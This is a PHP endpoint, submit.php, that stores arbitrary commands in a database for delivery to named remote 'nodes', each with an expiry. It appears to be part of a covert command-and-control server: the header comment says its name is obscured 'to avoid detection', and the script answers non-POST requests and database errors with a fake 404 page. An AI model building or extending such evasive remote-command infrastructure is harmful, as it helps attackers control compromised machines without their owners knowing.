<?php
/**
 * submit.php - Queue command endpoint
 * Obscured name to avoid detection
 */

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    send404();
}

$validated = validateRequest();
$db = getDB();

if (!$db) {
    sendJSON(['error' => 'Service unavailable'], 503);
}

try {
    $body = $validated['body'];
    
    // Get target node by hostname or custom_name
    $targetNode = $body['target_node'] ?? null;
    $command = $body['command'] ?? null;
    $ttlDays = $body['ttl_days'] ?? DEFAULT_TTL_DAYS;
    
    if (!$targetNode || !$command) {
        sendJSON(['error' => 'Missing required fields'], 400);
    }
    
    // Find target node
    $stmt = $db->prepare("
        SELECT id FROM nodes 
        WHERE (hostname = ? OR custom_name = ?) AND status = 'active'
        LIMIT 1
    ");
    $stmt->execute([$targetNode, $targetNode]);
    $node = $stmt->fetch();
    
    if (!$node) {
        sendJSON(['error' => 'Node not found'], 404);
    }
    
    // Insert command
    $insertStmt = $db->prepare("
        INSERT INTO commands (node_id, command, status, expires_at)
        VALUES (?, ?, 'pending', DATE_ADD(NOW(), INTERVAL ? DAY))
    ");
    $insertStmt->execute([$node['id'], $command, $ttlDays]);
    $commandId = $db->lastInsertId();
    
    sendJSON([
        'status' => 'ok',
        'command_id' => $commandId,
        'message' => 'Command queued'
    ]);
    
} catch (PDOException $e) {
    error_log("Submit error: " . $e->getMessage());
    send404();
}

?>

